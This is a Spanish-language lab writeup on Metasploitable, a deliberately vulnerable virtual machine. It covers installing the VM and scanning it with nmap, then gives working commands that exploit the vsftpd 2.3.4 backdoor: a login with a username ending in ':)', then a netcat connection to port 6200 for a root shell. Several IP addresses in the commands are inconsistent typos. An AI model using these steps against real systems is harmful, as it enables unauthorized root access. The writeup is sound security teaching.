## Introduccion

Metasploitable es una máquina virtual vulnerable diseñada específicamente para practicar pruebas de penetración y análisis de seguridad en entornos controlados. Fue creada por Rapid7 como una plataforma educativa que permite a estudiantes y profesionales de ciberseguridad identificar, explotar y comprender distintas vulnerabilidades reales presentes en sistemas y servicios mal configurados.

Esta máquina incluye aplicaciones desactualizadas, configuraciones inseguras y múltiples fallos conocidos, lo que la convierte en un entorno ideal para aprender técnicas de enumeración, explotación y post-explotación sin poner en riesgo sistemas reales. Debido a su naturaleza deliberadamente vulnerable, se recomienda utilizarla únicamente en laboratorios aislados y con fines educativos.

En este Writeup, aprenderemos cómo realizar todos los procedimientos necesarios para comprometer Metasploitable, desde instalar la máquina virtual hasta explotar la mayoría de los servicios activos de la forma más manual posible.

## Instalacion
Para la instalación de Metasploitable, accedemos al link de descarga para obtener la máquina:
[**Metasploitable - SourceForge**](https://sourceforge.net/projects/metasploitable/)

![1](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/1.png)

Una vez que hayamos descargado la maquina virtual, es momento de instalarla en nuestro hipervirtualizador preferido e iniciarla (para este ejemplo usare [**VMware**](https://www.vmware.com/)):

Como primer paso para instalar la maquina virtual, presionamos el boton "Abrir una maquina virtual" y seleccionamos el archivo descargado:
![2](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/2.png)
![3](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/3.png)

A partir de este momento, podemos iniciar Metasploitable y empezar a auditarla con nuestra maquina atacante.

## Reconocimiento
 En caso de que no sepamos cual es la direccion IP de la maquina, podemos usar nmap para escanear la red y distinguir nuestro objetivo con el siguiente comando (En mi caso la red es 192.168.0/24):
 ```bash
nmap -sn 192.168.0/24
```
Ahora que conocemos la IP de la maquina, podemos iniciar a escanear los puertos con nmap (recomiendo el siguiente comando facilitar los futuros procesos):
```bash
nmap -p- 192.168.143 -oN openPorts.txt
```
![4](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/4.png)
Como podemos ver hay una gran cantidad de puertos y servicios activos en Metasploitable, por esta razon es una excelente maquina para practicar. 

Ya que sabemos que puertos estan abiertos, vamos a hacer un escaneo exhaustivo para ver exactamente que servicios (y cual version de estos) estan corriendo y si tienen alguna vulnerabilidad conocida.

> Con el siguiente script podemos copiar de forma automatica todos los puertos abiertos de la maquina, guardados en el archivo openPorts.txt para el escaneo exhaustivo que haremos posteriormente en nmap:
```bash
cat openPorts.txt | grep -E "[1-9]" | head -n -2 | tail -n +5 | awk -F/ '{print $1}' | paste -sd, | xclip -selection clipboard
```
Ahora procedemos a ralizar el escaneo exhaustivo con el siguiente comando:
```bash
nmap -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,32966,33785,34219,42886 -sCV -Pn 192.168.5.143 -oN nmap.txt
```
La salida del comando anterior nos proporciona informacion muy util sobre los servicios activos, incluyendo posibles vulnerabilidades que podriamos explotar.

## Explotacion
### FTP
El escaneo de nmap nos proporciono esta informacion sobre la instancia de FTP activa en la maquina victima:
```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.5.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
```
La salida anterior nos deja saber que el FTP en ejecucion es vsftpd 2.3.4. Esta version fue publicada con un backdoor, el cual permite obtener una shell dentro del sistema simplemente con iniciar sesion con un nombre de usuario al que se le incluya los caracteres ":)" al final.

Como mencione en la introduccion, todos los ataques redactados aqui, se realizaran de forma manual. Esto es con el proposito de realmente entender las vulnerabilidades presentadas, y aprender a explotarlas. A continuacion, vamos a ver como conectarnos a este backdoor paso por paso.

Nos conectamos a la instancia de FTP del objetivo con un cualquier nombre de usuario, pero es obligatorio que termine con ":)", y como contrasena ponemos cualquier cosa, o incluso nada.
```bash
ftp 192.168.5.143
```
![5](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/5.png)
Al iniciar sesion, notamos que la conexion se "paraliza" esto es porque el backdoor abrio una shell en el puerto 6200 del sistema victima y esta esperando por conexiones. Al conectarnos a la shell, ingresamos al sistema como root. Esto es porque el servicio FTP se ejecutaba con permisos del usuario administrador:
```bash
nc 192.168.5.143 6200
```
![6](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/6.png)
Y de esta forma habremos explotado Metasploitable a traves de FTP.







